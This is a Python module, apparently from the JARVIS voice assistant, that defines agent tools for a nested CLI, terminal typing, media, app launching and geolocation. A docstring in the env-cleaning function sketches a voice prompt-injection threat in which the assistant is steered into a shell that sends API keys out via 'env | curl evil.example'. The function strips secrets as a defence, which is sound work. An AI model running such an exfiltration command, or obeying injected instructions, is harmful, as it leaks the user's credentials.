# Resolved once at import: ~/.jarvis/SOUL.md override → prompts/soul.md →
# DEFAULT_SOUL. Prepended to JARVIS_INSTRUCTIONS in _build_initial_prompt_state.
SOUL: str = _load_soul()


# System-prompt appendix fed to the CLI for every voice invocation.
# Without it, `--bare` strips all project context and the CLI gives
# advice/tutorials instead of actually running things ("open
# firefox" → explains what firefox is instead of launching it).
# The file enumerates the DO-don't-narrate rules for Tier 1 actions.
JARVIS_CLI_VOICE_PROMPT = os.environ.get(
    "JARVIS_CLI_VOICE_PROMPT",
    str(Path(__file__).parent / "cli_voice_prompt.md"),
)

# ANSI escape sequences leak through from the CLI's coloured output
# and read as noise when TTS tries to voice them. Stripped before
# returning the tool result to the LLM.
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")


def _clean_env_for_cli(cli_model_id: str) -> dict[str, str]:
    """
    Strip Claude-Code env vars that would make the nested CLI bypass
    the local proxy (port 4000) or enable features we don't want
    (analytics, nested-session detection). Matches the `cleanEnv`
    block from the old speech.ts runAgent.

    Also forces JARVIS_PROVIDER + JARVIS_MODEL based on the user's
    tray pick. The CLI reads JARVIS_PROVIDER for proxy routing and
    JARVIS_MODEL_REGISTRY_ENABLED=1 makes the CLI's per-request
    /model overrides honour our chosen model.

    **Per enterprise plan §P0-SEC-8 (added 2026-05-17):** also strip
    every `*_API_KEY` / `*_SECRET` / `*_TOKEN` from the inherited env
    EXCEPT the proxy stub keys the CLI legitimately needs to route
    through localhost:4000. Background: a voice prompt-injection that
    talked the supervisor into running `run_jarvis_cli` could otherwise
    have its CLI subprocess exfiltrate Groq / Anthropic / OpenAI /
    DeepSeek / Kimi / LiveKit / Google / GitHub / Vercel API keys via
    one bash one-liner (`env | curl evil.example`). Now the CLI gets
    the same ANTHROPIC_BASE_URL=localhost:4000 + ANTHROPIC_API_KEY=
    'jarvis-proxy' stub it needs to talk to the proxy, but no real
    upstream keys. The proxy at :4000 holds the real keys and signs
    the outbound requests.
    """
    cli_def = CLI_MODELS[cli_model_id]

    # Suffixes that mark "secret-y" env vars to strip. Conservative
    # allowlist of stripping rules — keeps env vars the CLI legitimately
    # needs (PATH, HOME, USER, LANG, TZ, XDG_*, DISPLAY, JARVIS_*,
    # NODE_*, npm_*, etc.) untouched.
    _SECRET_SUFFIXES = ("_API_KEY", "_SECRET", "_TOKEN", "_PASSWORD")
    _SECRET_NAMES = {
        # Explicit names that don't match the suffix pattern but are
        # still real upstream credentials.
        "OPENAI_API_KEY", "ANTHROPIC_API_KEY",  # match _API_KEY but
                                                 # documenting intent
        "GH_TOKEN", "GITHUB_TOKEN",              # GitHub CLI auth
        "DATABASE_URL", "POSTGRES_PASSWORD",     # database creds
        "REDIS_URL",                              # Redis if password-protected
        "VERCEL_TOKEN", "VERCEL_OIDC_TOKEN",     # deploy creds
    }

    env: dict[str, str] = {}
    stripped: list[str] = []
    for k, v in os.environ.items():
        if v is None:
            continue
        if k.startswith("CLAUDE_CODE_") or k.startswith("CLAUDE_DESKTOP_"):
            continue
        if k == "CLAUDECODE":
            continue
        # Strip secrets unless we explicitly need to keep them. The
        # `setdefault` calls below restore ANTHROPIC_BASE_URL +
        # ANTHROPIC_API_KEY with the proxy-stub values, so stripping
        # them here is safe — they'll come back as 'jarvis-proxy'.
        if any(k.endswith(suffix) for suffix in _SECRET_SUFFIXES) or k in _SECRET_NAMES:
            stripped.append(k)
            continue
        env[k] = v
    if stripped:
        logger.info(
            f"[run_jarvis_cli] stripped {len(stripped)} secret env var(s) from CLI subprocess: "
            f"{', '.join(sorted(stripped))}"
        )
    env.setdefault("ANTHROPIC_BASE_URL", "http://localhost:4000")
    env.setdefault("ANTHROPIC_API_KEY",  "jarvis-proxy")
    # Bash, not zsh — zsh's NOMATCH would fail on URL-with-`?` args
    # the CLI passes to xdg-open / curl.
    env["SHELL"] = "/bin/bash"
    # Override the CLI's default model to match the tray pick.
    env["JARVIS_PROVIDER"]                = cli_def["provider"]
    env["JARVIS_MODEL"]                   = cli_def["model"]
    env["JARVIS_MODEL_REGISTRY_ENABLED"]  = "1"
    for k in (
        "DISABLE_TELEMETRY",
        "DISABLE_ERROR_REPORTING",
        "DISABLE_BUG_COMMAND",
        "DISABLE_NON_ESSENTIAL_MODEL_CALLS",
        "DISABLE_AUTOUPDATER",
        "DISABLE_COST_WARNINGS",
    ):
        env[k] = "1"
    return env


@function_tool
async def run_jarvis_cli(request: str) -> str:
    """Execute any request that needs real tools — shell, files, web, system state.

    Call this tool whenever the user asks for something you cannot
    answer from conversation alone. Examples:
      - shell / running processes / system state / what's installed
      - real-time data: current time, weather, date, news, prices
      - file reads / writes / searches / git / code inspection
      - opening, launching, controlling apps (spotify, firefox, terminal)
      - browsing the web / fetching URLs / looking things up

    Pass the user's natural-language request verbatim — the CLI agent
    has its own system prompt and tool set and will interpret the
    request itself. Return the CLI agent's reply; you can summarise
    or rephrase it for voice if it's long, but do NOT invent tool
    results.

    Args:
        request: The user's request in their own words.

    Returns:
        The CLI agent's reply as plain text (ANSI stripped).
    """
    # Per-turn chain limiter. Each user turn resets the counter; the
    # tool returns an instructional error after the Nth call so the
    # LLM is forced to TALK to the user instead of running another
    # 24-second CLI invocation. Without this, an ambiguous user
    # question can trigger run_jarvis_cli #1 → output → #2 → output →
    # #3 ... while the user waits 60+ seconds wondering if JARVIS
    # broke.
    global _tool_calls_this_turn
    _tool_calls_this_turn += 1
    if _tool_calls_this_turn > _TURN_TOOL_CALL_LIMIT:
        logger.warning(
            f"run_jarvis_cli refused (chain limit {_TURN_TOOL_CALL_LIMIT} "
            f"reached); LLM should reply to user instead. request={request[:80]!r}"
        )
        return (
            "(Tool-call chain limit reached for this turn. You've "
            "already run the CLI tool more than once. Stop chaining and "
            "actually reply to the user with what the previous tool call "
            "returned. If you genuinely need to run more commands, ask "
            "the user 'Should I keep going?' first — they've been "
            "waiting and they want to hear from you, not see more tool "
            "calls fire.)"
        )

    cli_model_id = read_cli_model()
    cli_provider = CLI_MODELS[cli_model_id]["provider"]
    logger.info(
        f"run_jarvis_cli [{cli_model_id}] turn-call #{_tool_calls_this_turn} → "
        f"{request[:80]}"
    )
    # Mark the tool as busy so the tray can show amber "thinking"
    # for the full duration of the CLI subprocess (which is what
    # the user actually wants to see — silent gold while we work).
    _mark_tool_start("run_jarvis_cli")
    try:
        # Invoke the CLI script via its own shebang (`#!/usr/bin/env bash`).
        # Running through `sh` here breaks — start.sh uses bash-only
        # features (BASH_SOURCE, arrays, `[[`). The executable bit is
        # already set, so exec'ing the path directly picks up the right
        # interpreter.
        # Build argv. `--append-system-prompt-file` is what lets us tell
        # the CLI "this is voice — act, don't explain." We previously
        # also passed `--bare`, but `--bare` sets CLAUDE_CODE_SIMPLE=1
        # which strips the tool pool down to [Bash, Read, Edit] and
        # blocks the Agent / Skill / Plan tools. Voice users couldn't
        # dispatch subagents, and the CLI model would hallucinate
        # "subagent results" by role-playing with backgrounded Bash —
        # confirmed by parallel-dispatch tests on deepseek-v4-pro.
        # Tradeoff: full mode adds ~1-2 s of plugin/skill/LSP startup
        # to each tool-using voice turn. Worth it to unlock real agent
        # dispatch and the fuller tool surface.
        argv = [
            JARVIS_CLI_SCRIPT,
            cli_provider,    # start.sh accepts the provider name as argv[1]
            "-p",
        ]
        if os.path.exists(JARVIS_CLI_VOICE_PROMPT):
            argv += ["--append-system-prompt-file", JARVIS_CLI_VOICE_PROMPT]
        argv += ["--", request]

        try:
            proc = await asyncio.create_subprocess_exec(
                *argv,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.DEVNULL,
                cwd="/tmp",
                env=_clean_env_for_cli(cli_model_id),
            )
        except (FileNotFoundError, PermissionError) as e:
            return f"(CLI script unavailable: {e})"

        try:
            stdout_b, stderr_b = await asyncio.wait_for(
                proc.communicate(), timeout=JARVIS_CLI_TIMEOUT_S,
            )
        except asyncio.TimeoutError:
            # Two-stage kill: SIGTERM → wait 2 s → SIGKILL if still alive.
            # Matches the speech.ts pattern; Claude-Code can trap SIGTERM
            # and hang on shutdown, pinning agentBusy forever in the old
            # design.
            proc.terminate()
            try:
                await asyncio.wait_for(proc.wait(), timeout=2.0)
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()
            return f"(tool ran past its {JARVIS_CLI_TIMEOUT_S} s deadline and was cancelled)"

        text = _ANSI_RE.sub("", stdout_b.decode("utf-8", errors="replace")).strip()
        err  = stderr_b.decode("utf-8", errors="replace").strip()
        logger.info(
            f"run_jarvis_cli done exit={proc.returncode} "
            f"out_len={len(text)} err_len={len(err)}"
        )
        if not text:
            if err:
                return f"(no output; stderr tail: {err[-200:]})"
            return "(no output)"
        return text
    finally:
        _mark_tool_end()


# ── Tool: type into a visible terminal window ─────────────────────────
#
# run_jarvis_cli runs invisibly — its subprocess stdout is captured
# into Python and never reaches the user's screen. When the user says
# "in my open terminal" / "I want to see it run", they want the
# command to land in a real visible terminal so they can watch it
# execute (and edit/cancel before pressing Enter if they want).
#
# This tool finds the most recent visible terminal window via
# xdotool's WM_CLASS regex match across the common emulators (gnome,
# xterm, kitty, alacritty, konsole, foot, wezterm, terminator, tilix),
# focuses it, types the literal command, and presses Return.
#
# Caveats:
#   - X11 only. Wayland sessions need different machinery.
#   - If no terminal is open, returns a "(no terminal found)" string
#     so the LLM can fall back to opening one or use run_jarvis_cli.
#   - Doesn't capture output — the user reads the terminal directly.

# WM_CLASS values for the common Linux terminal emulators. xdotool's
# regex is POSIX ERE (no (?i) inline flag) — most emulators use a
# lowercase WM_CLASS but a few (Alacritty, WezTerm, Terminator,
# Tilix) capitalise. Listed both forms explicitly so both match.
_TERMINAL_CLASS_RE = (
    r"("
    r"gnome-terminal|xterm|kitty|konsole|foot|qterminal|urxvt"
    r"|st-256color|terminology"
    r"|[Aa]lacritty|[Ww]ezterm|[Tt]erminator|[Tt]ilix"
    r")"
)


@function_tool
async def type_in_terminal(command: str) -> str:
    """Type a shell command into the user's open terminal so they can SEE it execute.

    Use this — NOT run_jarvis_cli — whenever the user says any of:
      - "run X in my terminal"
      - "in the terminal I have open"
      - "type this in my terminal"
      - "I want to see it / watch it run"
      - "show me the install live"
      - "do that in front of me"

    What it does: finds a visible terminal window (gnome-terminal,
    xterm, kitty, alacritty, konsole, foot, wezterm, etc.), focuses
    it, types the command literally, and presses Enter. The user sees
    the keystrokes appear and the command run in their own shell.

    What it does NOT do: capture output. You won't see the result;
    the USER does. Don't claim to "have run" the command — say
    something like "typed it into your terminal — running now."

    If no terminal window is open, this returns a "(no terminal
    found)" message — in that case tell the user to open a terminal,
    or fall back to run_jarvis_cli for an invisible run.

    Args:
        command: The shell command text to type. No trailing newline
                 needed; we press Enter after typing.
    """
    command = (command or "").strip()
    if not command:
        return "(no command supplied)"
    logger.info(f"type_in_terminal → {command[:80]}")

    # All desktop-control I/O goes through tools.desktop_control so the same
    # call works on Linux (xdotool backend) and Windows (pywinauto backend).
    # The helpers swallow failures into sentinels (False / None / empty list);
    # we surface them here as user-readable strings.
    from tools import desktop_control

    # Find a visible terminal window. On Linux the helper uses
    # ``xdotool search --name <class-regex>`` — we keep the class regex by
    # falling through to the lower-level escape hatch (the high-level
    # ``find_window_by_name`` matches on title, not WM_CLASS, so it would
    # miss most terminal emulators whose titles are user shell prompts).
    # On Windows the title-substring path is the right one — terminals there
    # surface their app name in the title bar.
    target: Optional[int] = None
    if platform.system() == "Linux":
        ok, out = desktop_control.xdotool_call(
            ["search", "--onlyvisible", "--class", _TERMINAL_CLASS_RE],
        )
        if not ok:
            # Most common cause: xdotool missing — but the helper also
            # returns False on timeout / non-zero exit. Surface the message.
            if "not installed" in out or "not available" in out.lower():
                return "(xdotool not installed)"
            return "(no terminal found — open one and ask again)"
        ids = [s for s in out.split() if s.strip()]
        if not ids:
            return "(no terminal found — open one and ask again)"
        # Last ID = most-recent in xdotool's stacking order.
        try:
            target = int(ids[-1])
        except ValueError:
            return "(no terminal found — open one and ask again)"
    else:
        # Windows / others — try common terminal app names by title substring.
        for app in ("Windows Terminal", "PowerShell", "Command Prompt", "cmd.exe", "wt.exe"):
            target = desktop_control.find_window_by_name(app)
            if target is not None:
                break
        if target is None:
            return "(no terminal found — open one and ask again)"

    # Activate the chosen window so it captures the keystrokes. The Linux
    # backend uses ``windowactivate --sync`` so the focus race (typing
    # before the WM grants focus) can't fire.
    if not desktop_control.activate_window(target):
        return "(could not focus terminal)"

    # Type literally — no shell expansion, no special-key parsing.
    if not desktop_control.type_text(command):
        return "(type failed)"

    # Press Enter to run the command. Best-effort — if Enter fails the text
    # is already in the terminal, so the user can press Enter themselves.
    desktop_control.send_keys("Return")

    return f"(typed into terminal: {command[:80]})"


# ── Tool: media control via playerctl ─────────────────────────────────
#
# Without this, JARVIS routes every "play / pause / resume / what's
# playing" through run_jarvis_cli — which (1) costs 5-10 s per call
# vs ~50 ms for direct playerctl, (2) regularly lands on the wrong
# player because `playerctl play` with no -p targets the most-recent
# active player (Chromium's YouTube tab beats Spotify if you watched
# anything recently), and (3) the CLI's underlying LLM hallucinates
# fake song titles when the actual playerctl status is empty.
#
# This tool talks to MPRIS directly via playerctl. Default target is
# Spotify because that's what 95% of music requests mean; pass an
# explicit `player` to override.
_MEDIA_VALID_ACTIONS = {
    "play", "pause", "play_pause", "next", "previous", "status", "open",
}

# How long to wait after a player launch for it to register on the
# DBus / MPRIS bus. Spotify on this box typically takes 1–2 s; we
# poll every 200 ms up to MEDIA_LAUNCH_VERIFY_SEC. If it never shows
# up, the tool tells the LLM the launch is unverified — preventing
# the "Done — playing chill playlist" hallucination from media_control
# saying nothing useful (the failure mode logged 2026-04-26).
MEDIA_LAUNCH_VERIFY_SEC = 3.0
MEDIA_LAUNCH_POLL_SEC   = 0.2


async def _player_on_bus(player: str) -> bool:
    """Quick check: is `player` registered on MPRIS / responsive to
    playerctl right now? Returns True if yes, False on any failure
    (process missing, timeout, bus not yet ready, etc)."""
    try:
        proc = await asyncio.create_subprocess_exec(
            "playerctl", "-p", player, "status",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await asyncio.wait_for(proc.communicate(), timeout=1.0)
        return proc.returncode == 0
    except Exception:
        return False


async def _launch_and_verify(player: str) -> str:
    """Popen-launch `player`, then poll the bus for up to
    MEDIA_LAUNCH_VERIFY_SEC. Return a string the LLM should narrate
    as-is — either confirming the launch worked or signalling
    "fired but unverified" so the LLM doesn't claim "Done."""
    try:
        _subprocess.Popen(
            [player],
            stdout=_subprocess.DEVNULL,
            stderr=_subprocess.DEVNULL,
            start_new_session=True,
        )
    except FileNotFoundError:
        return f"({player} isn't installed)"
    except Exception as e:
        return f"(could not launch {player}: {e})"

    loop = asyncio.get_running_loop()
    deadline = loop.time() + MEDIA_LAUNCH_VERIFY_SEC
    while loop.time() < deadline:
        await asyncio.sleep(MEDIA_LAUNCH_POLL_SEC)
        if await _player_on_bus(player):
            return f"opened {player} and verified it's running"
    return (
        f"launched {player} but it isn't on the bus yet — may need "
        f"~10 seconds to finish loading, or the launch failed silently. "
        f"Tell the user it's starting; ask again if they want playback."
    )


@function_tool
async def media_control(action: str, player: str = "spotify") -> str:
    """Control music / video MEDIA PLAYBACK — Spotify, VLC, mpv,
    Rhythmbox. NOT for browsers (Chrome / Firefox) — use
    transfer_to_desktop for those.

    Use for playback commands like:
      - "play music" / "play Spotify" / "resume"     → action="play"
      - "pause" / "stop the music"                   → action="pause"
      - "play / pause" / "toggle music"              → action="play_pause"
      - "next song" / "skip" / "next track"          → action="next"
      - "previous song" / "go back a song"           → action="previous"
      - "what's playing" / "current song"            → action="status"
      - "open Spotify" / "launch VLC"                → action="open"

    Default player is Spotify. Only override `player` for explicit
    media-player named requests ("pause VLC", "skip in mpv"). Common
    valid player names: spotify, vlc, mpv, rhythmbox, totem.

    NEVER use this tool for opening Chrome / Firefox / a browser. Even
    though they technically appear on MPRIS, launching them this way
    skips the user's required Chrome flags (--profile-directory,
    --new-window) and opens a guest profile. Browsers go through
    transfer_to_desktop which uses bash with the proper flags.

    If the player isn't running and the action is "play" or "open",
    we'll launch it. If it isn't running for any other action,
    the tool returns an honest "(not running)" string so you don't
    pretend it worked — voice that back to the user.

    Args:
        action: one of play, pause, play_pause, next, previous, status, open.
        player: media player name (default "spotify").

    Returns:
        A short plain-text status string. Voice it directly.
    """
    action = (action or "").strip().lower()
    player = (player or "spotify").strip().lower()
    if action not in _MEDIA_VALID_ACTIONS:
        return f"(unknown action: {action!r}; valid: {sorted(_MEDIA_VALID_ACTIONS)})"

    # Reject browser-as-player. media_control's _launch_and_verify uses
    # bare Popen([player]) which doesn't apply the user's required flags
    # (--profile-directory="Default", --new-window). Without those, Chrome
    # opens as a guest / fresh first-run profile — which the user has
    # complained about repeatedly. Browsers belong on transfer_to_desktop
    # (which uses bash with the proper flags). Reject and redirect.
    _BROWSER_NAMES = {
        "google-chrome", "chrome", "chromium", "chromium-browser",
        "firefox", "firefox-esr", "brave", "brave-browser",
        "edge", "microsoft-edge", "opera", "vivaldi",
    }
    if player in _BROWSER_NAMES:
        return (
            f"(media_control is for media players — Spotify / VLC / mpv / "
            f"Rhythmbox. For browsers, use transfer_to_desktop instead so "
            f"Chrome opens with --profile-directory=\"Default\" --new-window.)"
        )
    logger.info(f"media_control: action={action} player={player}")

    # "open" — launch the app and verify it actually shows up on the
    # MPRIS bus before claiming success. Without verification the
    # tool would return "opened spotify" even if the binary spawned
    # then immediately died (the failure mode that produced the
    # 2026-04-26 "playing chill playlist" hallucination).
    if action == "open":
        return await _launch_and_verify(player)

    # For all other actions, talk to playerctl. Build argv per action.
    if action == "status":
        argv = [
            "playerctl", "-p", player, "metadata",
            "--format", "{{status}} | {{artist}} - {{title}}",
        ]
    elif action == "play_pause":
        argv = ["playerctl", "-p", player, "play-pause"]
    else:  # play, pause, next, previous
        argv = ["playerctl", "-p", player, action]

    try:
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        out_b, err_b = await asyncio.wait_for(proc.communicate(), timeout=5.0)
    except FileNotFoundError:
        return "(playerctl not installed)"
    except asyncio.TimeoutError:
        return f"(playerctl timed out talking to {player})"
    except Exception as e:
        return f"(playerctl failed: {e})"

    out = out_b.decode("utf-8", errors="replace").strip()
    err = err_b.decode("utf-8", errors="replace").strip()

    # playerctl exits non-zero when the named player isn't on the
    # bus. If the user asked to PLAY and the player isn't running,
    # launch it via _launch_and_verify so the caller learns whether
    # the launch actually stuck (vs the old code path that just
    # Popen'd and returned "give it a moment" — which the LLM
    # consistently shortened to "Done", lying to the user).
    if proc.returncode != 0:
        if "no players" in err.lower() or "no such" in err.lower():
            if action in ("play", "play_pause"):
                return await _launch_and_verify(player)
            return f"({player} isn't running)"
        return f"(playerctl error: {err[:120]})"

    if action == "status":
        # Output format: "Playing | Artist - Title" or "Paused | ..."
        return out or f"({player} has no metadata)"
    return f"{action} sent to {player}"


# ── Reply post-scrubber regexes (used in the TTS chain below) ─────────
# TOOL_LEAK_RE catches the broader set of leaked tool-call shapes; the
# META and ARCHAIC openers gate the per-chunk regex applied to LLM
# output before it reaches the TTS synthesizer.
from pipeline.chat_ctx import (
    TOOL_LEAK_RE          as _TOOL_LEAK_RE,
    META_SILENCE_RE       as _META_SILENCE_RE,
    ARCHAIC_OPENER_RE     as _ARCHAIC_OPENER_RE,
)


# list_pending_proposals / accept_proposal / reject_proposal — retired
# 2026-05-12 alongside tools/log_analyzer.py. Autonomous self-evolution
# (pipeline.evolution.*) replaced them; every mutation now lands in
# ~/Documents/jarvis-evolution/<date>.md without voice prompting.


# ── Direct primitive tools ────────────────────────────────────────────
#
# These five live alongside `run_jarvis_cli` and shave 1–2 s of CLI
# subprocess startup off the SIMPLE / ATOMIC voice asks ("what time is
# it", "how much disk space is left", "what's in /etc/hostname"). They
# duplicate functionality the CLI also has, but the speech LLM hits
# them in-process — no subprocess spawn, no double-LLM hop.
#
# Discrimination rule (reinforced in JARVIS_INSTRUCTIONS):
#   - ATOMIC single-step ask  → bash / read_file / web_fetch / glob_files / grep_files
#   - MULTI-step / agent-loop / sub-agent / plan / MCP / skills → run_jarvis_cli
# When in doubt, prefer run_jarvis_cli — its CLI agent loop will pick
# the right tool itself. The cost of a wrong direct-tool pick is a
# wrong answer; the cost of an unnecessary CLI hop is a few seconds.

# Output cap mirrors the CLI's BashTool behaviour. Voice-LLM context
# can't usefully carry more than this without truncation showing up in
# the spoken reply.
_DIRECT_TOOL_OUTPUT_CAP = 3_000


def _truncate(text: str, cap: int = _DIRECT_TOOL_OUTPUT_CAP) -> str:
    if len(text) <= cap:
        return text
    return text[:cap] + f"\n…[truncated {len(text) - cap} bytes]"


# The shell tool now ships from the registry framework as `terminal`
# (tools/terminal_tool.py), loaded via load_all_livekit_tools(). The
# legacy module-level `bash` re-export (for the retired subagents/
# desktop.py) was dropped with the subagent teardown.


@function_tool
async def launch_app(binary: str, args: str = "") -> str:
    """Launch a desktop GUI application with verification.

    Use this INSTEAD of raw bash() for opening applications. Two-stage
    verification:
      1. Pre-flight: check the binary exists on PATH (catches typos
         like 'notepad' on Linux, where bash 'setsid -f notepad' would
         silently exit 0 because setsid forks before notepad fails to
         exec — leaving the LLM to falsely claim success).
      2. Post-launch: capture stderr to a log file, then poll a
         cross-platform process probe (tools.runtime.is_process_running,
         backed by psutil) to confirm a matching process is alive
         within 4s of spawn. If not, surface the captured stderr so
         the LLM can report a specific failure instead of "X opened, sir".

    Args:
        binary:  Executable name, e.g. 'google-chrome', 'code',
                 'qterminal'. No path needed; PATH is searched.
        args:    Optional flags as one string,
                 e.g. '--new-window --profile-directory="Default"'.

    Returns:
        'OK: launched ...'                — process verified alive
        'MISSING: <binary> ...'           — binary not on PATH
        'CRASHED: <binary> ...<stderr>'   — exec'd then died

    Voice replies should mirror the result honestly:
        OK      → 'Done.' / '<App> opened.'
        MISSING → '<App> is not installed.'
        CRASHED → '<App> failed to start.'
    """
    import shutil
    bin_only = (binary or "").strip().split()[0] if binary else ""
    if not bin_only:
        return "MISSING: no binary supplied"
    bin_path = shutil.which(bin_only)
    if bin_path is None:
        try:
            log_launch_attempt(binary=bin_only, outcome="MISSING")
        except Exception:
            pass
        return f"MISSING: '{bin_only}' is not installed on this system"

    args_clean = (args or "").strip()
    # Cross-platform tmp path: Linux still resolves to /tmp/, Windows to %TEMP%.
    import tempfile as _tempfile
    log_path = str(
        Path(_tempfile.gettempdir())
        / f"jarvis-launch-{bin_only.replace('/', '_')}-{int(time.time())}.log"
    )
    # On Linux we keep the `setsid -f` shell command so the child fully
    # detaches from the worker's session (double-fork via setsid). On
    # Windows there is no setsid in PATH — fall back to Popen with the
    # detach kwargs from tools.runtime.detached_popen_kwargs() (which
    # sets CREATE_NEW_PROCESS_GROUP + DETACHED_PROCESS). Both branches
    # write child stdout/stderr to log_path.
    if platform.system() == "Linux":
        import shlex as _shlex
        argv = ["setsid", "-f", bin_path, *(_shlex.split(args_clean) if args_clean else [])]
        logger.info(f"launch_app → {argv}")
        try:
            log_fh = open(log_path, "wb")
            proc = await asyncio.create_subprocess_exec(
                *argv,
                stdout=log_fh,
                stderr=log_fh,
            )
            await asyncio.wait_for(proc.wait(), timeout=5.0)
        except Exception as e:
            return f"CRASHED: spawn error — {e}"
    else:
        # Windows / macOS path — uses detached_popen_kwargs() to detach
        # the child (CREATE_NEW_PROCESS_GROUP + DETACHED_PROCESS on
        # Windows) so it survives a worker bounce. The post-launch
        # verifier below uses psutil (cross-platform) since pgrep is
        # Linux-only.
        from tools.runtime import detached_popen_kwargs as _detach_kwargs
        import shlex as _shlex
        argv = [bin_path, *(_shlex.split(args_clean) if args_clean else [])]
        logger.info(f"launch_app (non-Linux) → {argv}")
        try:
            log_fh = open(log_path, "wb")
            _subprocess.Popen(
                argv,
                stdout=log_fh,
                stderr=log_fh,
                **_detach_kwargs(),
            )
        except Exception as e:
            return f"CRASHED: spawn error — {e}"

    # Poll up to 4s, returning as soon as the app appears. The old
    # fixed 600ms sleep raced cold-starting GUI apps (e.g. chrome takes
    # >1s on first launch — extensions + profile load). On the user-
    # visible "first attempt fails / second succeeds" pattern, the second
    # attempt only succeeded because chrome was now running from the
    # first attempt that we'd given up on too early. Bug fixed 2026-05-08.
    #
    # Cross-platform process probe (Phase 3.1): tools.runtime.is_process_running
    # uses psutil under the hood — works on Linux + Windows + macOS, no
    # shellout to pgrep (which is Linux-only and would silently report
    # "not running" on Windows).
    from tools.runtime import is_process_running
    running = False
    for _ in range(20):  # 20 × 0.2s = 4s budget
        await asyncio.sleep(0.2)
        try:
            if is_process_running(bin_only):
                running = True
                break
        except Exception:
            continue

    if not running:
        try:
            stderr_tail = Path(log_path).read_text(encoding="utf-8", errors="replace")[:280]
        except Exception:
            stderr_tail = ""
        try:
            log_launch_attempt(binary=bin_only, outcome="CRASHED")
        except Exception:
            pass
        return (
            f"CRASHED: '{bin_only}' exited immediately. "
            f"stderr: {stderr_tail.strip() or '(empty)'}"
        )

    try:
        log_launch_attempt(binary=bin_only, outcome="OK")
    except Exception:
        pass
    return f"OK: launched '{bin_only}'"


# ── Location tools ───────────────────────────────────────────────────
# JARVIS exposes TWO location tools, deliberately split per the 2026-05-17
# audit (Siri/Google/Alexa all separate these; see prompts/supervisor.md
# "LOCATION QUESTIONS"):
#
#   saved_address()    — user's declared address (file-backed, set by
#                        the user). The canonical answer to "what's my
#                        address". Returns "no saved address" when unset
#                        so the LLM asks rather than guessing.
#   current_location() — IP/Wi-Fi/Google live lookup. Returns a string
#                        with embedded precision marker so the LLM
#                        cannot voice detail finer than what the
#                        underlying signal supports.
#
# Past failure 2026-05-17 22:45 UTC: the unified get_location() returned
# "Columbus, Ohio, US" (IP geo); user asked "be more specific"; the
# supervisor LLM confabulated "Parsons Avenue, Columbus, Ohio" — no GPS
# hardware, no Wi-Fi accuracy, no source for a street. The split + the
# precision marker make this confab structurally impossible: an LLM
# voicing a street when precision=city is now contradicting its own
# tool result.

# Cache the live-lookup result for ~10 min so repeated "where am I"
# turns don't hammer ipinfo/Google. saved_address has no cache — file
# read is ~ms.
_CURRENT_LOCATION_CACHE: dict[str, object] = {"value": None, "ts": 0.0}
_CURRENT_LOCATION_TTL_S = 600.0
# Path for the user's saved address. Renamed from `location-override`
# 2026-05-17 to reflect that this is the user's declared address (not
# an override for live geolocation). The bad value sitting at the old
# path was deleted in the same change; legacy paths are not migrated
# because the prior contents were observed to be IP-geo guesses that
# should not propagate.
_SAVED_ADDRESS_PATH = Path.home() / ".jarvis" / "saved-address"


# Precision bands used by current_location to advertise how trustworthy
# its answer is. Mirrors Google Geocoding API's `location_type` enum
# (ROOFTOP / RANGE_INTERPOLATED / GEOMETRIC_CENTER / APPROXIMATE) but
# uses voice-friendlier names. The supervisor prompt forbids voicing
# any detail finer than the returned band.
_PRECISION_STREET = "street"        # < 50 m — confident street/road
_PRECISION_BLOCK = "block"          # < 500 m — neighborhood
_PRECISION_CITY = "city"            # < 5 km — city accurate
_PRECISION_REGION = "region"        # < 50 km — state/province
_PRECISION_COUNTRY = "country"      # else — country only

def _precision_from_accuracy_m(accuracy_m: float | None) -> str:
    """Map a Google Geolocation accuracy radius to a coarse precision
    band the LLM can reason about. Conservative: under 50m claims
    street but never rooftop (we have no exact-match signal — Google's
    API rounds to building only with strong AP density)."""
    if accuracy_m is None:
        return _PRECISION_CITY  # IP fallback default — never claim block/street
    if accuracy_m < 50:
        return _PRECISION_STREET
    if accuracy_m < 500:
        return _PRECISION_BLOCK
    if accuracy_m < 5000:
        return _PRECISION_CITY
    if accuracy_m < 50000:
        return _PRECISION_REGION
    return _PRECISION_COUNTRY


async def _collect_wifi_bssids() -> list[dict]:
    """Scan nearby Wi-Fi APs via nmcli. Returns a list of access-point
    dicts in the shape Google Geolocation API + similar services
    expect: `[{"macAddress": "AA:BB:...", "signalStrength": -dBm}, ...]`.

    Returns [] if nmcli is missing or no APs are visible. The caller
    should treat that as "Wi-Fi-based geo unavailable" and fall back
    to IP geo.
    """
    try:
        proc = await asyncio.create_subprocess_exec(
            "nmcli", "-t", "-f", "BSSID,SIGNAL", "device", "wifi", "list",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=4.0)
    except Exception as e:
        logger.debug(f"[current_location] nmcli scan failed: {e}")
        return []
    aps: list[dict] = []
    for line in out_b.decode("utf-8", errors="replace").splitlines()[:12]:
        # nmcli's escaped output: `30\:86\:2D\:84\:E9\:81:79`
        # First 6 colon-separated octets are the BSSID; trailing field is signal %.
        clean = line.replace(r"\:", ":")
        parts = clean.split(":")
        if len(parts) < 7:
            continue
        bssid = ":".join(parts[:6])
        try:
            signal_pct = int(parts[6])
        except ValueError:
            continue
        # Convert nmcli's 0-100 % to a rough dBm: 100% ≈ -30 dBm,
        # 0% ≈ -100 dBm. Linear interpolation; precise enough for
        # Google's API (it weighs by relative strength).
        signal_dbm = -100 + (signal_pct * 0.7)
        aps.append({
            "macAddress": bssid,
            "signalStrength": int(signal_dbm),
        })
    return aps


async def _google_geolocate(
    api_key: str, aps: list[dict]
) -> tuple[float, float, float | None] | None:
    """Hit Google Geolocation API with the BSSID list. Returns
    (lat, lng, accuracy_m) or None on any failure.

    `accuracy_m` is Google's reported 95%-confidence radius in meters —
    typically ~20m on dense Wi-Fi BSSID hits, hundreds-to-thousands on
    cell/IP fallback. Pass through to the caller so it can advertise a
    precision band, not just a coordinate. The accuracy field may be
    absent on some responses; caller treats None as "unknown" and
    defaults to city precision.
    """
    if not api_key or not aps:
        return None
    import json as _json
